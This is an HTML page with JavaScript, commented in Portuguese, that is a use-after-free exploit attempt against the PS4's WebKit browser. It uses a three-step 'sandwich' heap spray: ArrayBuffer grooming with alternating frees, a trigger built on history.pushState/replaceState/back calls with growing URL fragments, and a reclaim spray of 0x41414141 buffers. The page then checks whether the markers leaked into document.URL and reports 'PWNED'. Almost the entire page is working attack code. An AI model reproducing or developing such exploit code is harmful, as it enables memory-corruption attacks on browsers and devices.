<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Sandwich Strategy</title>
<style>
    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #0f0; background: #002200; color: #fff;
        text-transform: uppercase;
    }
    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
</style>
</head>
<body>
<h2>PS4 WebKit - 3-Step Spray (Sandwich Strategy)</h2>
<div id="status">Aguardando...</div>

<button onclick="runSandwichExploit()">INICIAR ATAQUE SANDUÍCHE</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var grooming = []; // Spray 1
var attack = [];   // Spray 3

// TÉCNICA PSFREE: GC para limpar e organizar
function forceGC() {
    for (let i = 0; i < 2; i++) {
        new Uint8Array(4 * 1024 * 1024);
    }
}

async function runSandwichExploit() {
    logEl.innerHTML = "";
    grooming = [];
    attack = [];
    statusEl.innerText = "Preparando...";

    const TARGET_SIZE = 340356;
    
    // === PASSO 1: PRE-SPRAY (GROOMING) ===
    // Enchemos o Heap com "paredes" para evitar que o buraco mude de tamanho
    log("1. [SPRAY 1] Preparando o terreno (Grooming)...");
    
    const GROOM_COUNT = 1000;
    for(let i=0; i<GROOM_COUNT; i++) {
        // Usamos ArrayBuffer para ser idêntico ao alvo final
        let buf = new ArrayBuffer(TARGET_SIZE);
        let view = new Uint32Array(buf);
        view[0] = 0x11111111; // Marcador visual
        grooming.push({ buf: buf, id: i });
    }
    
    log("2. Criando buracos (Swiss Cheese)...");
    // Liberamos objetos alternados (pares) para criar espaços onde o UAF vai cair
    let holes = 0;
    for(let i=0; i<GROOM_COUNT; i+=2) {
        grooming[i] = null;
        holes++;
    }
    
    // Força o GC para efetivar os buracos
    forceGC();
    await sleep(100);
    log(`${holes} buracos preparados para receber o UAF.`);

    // === PASSO 2: TRIGGER UAF (INTACTO) ===
    log("3. Disparando UAF Original...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // MOMENTO DO ATAQUE
        if (i === 47) {
            log(">>> [SPRAY 3] RECLAIM <<<");
            
            // Agenda a liberação
            setTimeout(() => history.back(), 0);
            
            // Executa o spray de ataque IMEDIATAMENTE
            // Como temos "paredes" (os buffers ímpares do grooming), 
            // o buraco não pode expandir. O spray deve encaixar.
            doAttackSpray(TARGET_SIZE);
            
            // GC rápido pós-ataque
            setTimeout(() => forceGC(), 10);
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(300);

    // === PASSO 3: VERIFICAÇÃO ===
    checkResult();
}

function doAttackSpray(size) {
    // Cria buffers de ataque
    // Variação pequena (-16 a +16) só por segurança de header
    for(let delta = -16; delta <= 16; delta += 4) {
        for(let k=0; k<50; k++) {
            try {
                let buf = new ArrayBuffer(size + delta);
                let view = new Uint32Array(buf);
                // Marcador 'AAAA'
                view[0] = 0x41414141; 
                view[1] = 0x41414141;
                // Preenche o meio também
                let mid = Math.floor(view.length / 2);
                view[mid] = 0x41414141;
                
                attack.push(buf);
            } catch(e) {}
        }
    }
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    // Procura por 'A' (0x41)
    for(let i=1000; i<5000; i++) {
        if(url.charCodeAt(i) === 0x41) { 
            changed = true;
            sample = "Encontrado 'AAAA' no offset " + i;
            break;
        }
    }

    if(changed) {
        log("!!! JACKPOT !!!");
        log("Técnica de 3 Sprays funcionou!");
        log(sample);
        statusEl.innerText = "PWNED";
        statusEl.style.backgroundColor = "#0f0";
        statusEl.style.color = "#000";
    } else {
        log("Falha: Ainda vendo 'V'.");
        log("O UAF pode estar caindo fora dos buracos preparados.");
    }
}
</script>
</body>
</html>
